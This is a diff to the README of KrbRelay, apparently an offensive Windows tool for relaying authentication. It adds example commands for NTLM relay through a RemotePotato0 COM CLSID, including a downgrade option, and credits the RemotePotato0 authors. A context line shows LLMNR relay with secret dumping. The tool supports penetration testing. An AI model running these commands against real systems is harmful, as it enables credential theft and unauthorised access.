@@ -53,6 +53,10 @@ Some protocols are more completed than others, PR's are welcomed.
 
 # LLMNR
 .\KrbRelay.exe -llmnr -spn 'cifs/win2019.htb.local' -secrets
+
+# NTLM (see https://github.com/antonioCoco/RemotePotato0 for CLSIDs)
+.\KrbRelay.exe -session 1 -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm
+.\KrbRelay.exe -session 1 -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm -downgrade
 ````
 
  `CheckPort.exe` is a C# tool that can be used to discover available ports for the OXID resolver.
@@ -192,3 +196,4 @@ Access is denied.
 * [TalAloni](https://github.com/TalAloni/) for [SMBLibrary](https://github.com/TalAloni/SMBLibrary)
 * [MichaelGrafnetter](https://twitter.com/mgrafnetter) for [DSInternals](https://github.com/MichaelGrafnetter/DSInternals)
 * [Kevin Robertson](https://twitter.com/kevin_robertson) for [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
+* [decoder_it](https://twitter.com/decoder_it) and [splinter_code](https://twitter.com/splinter_code) for [RemotePotato0](https://github.com/antonioCoco/RemotePotato0)
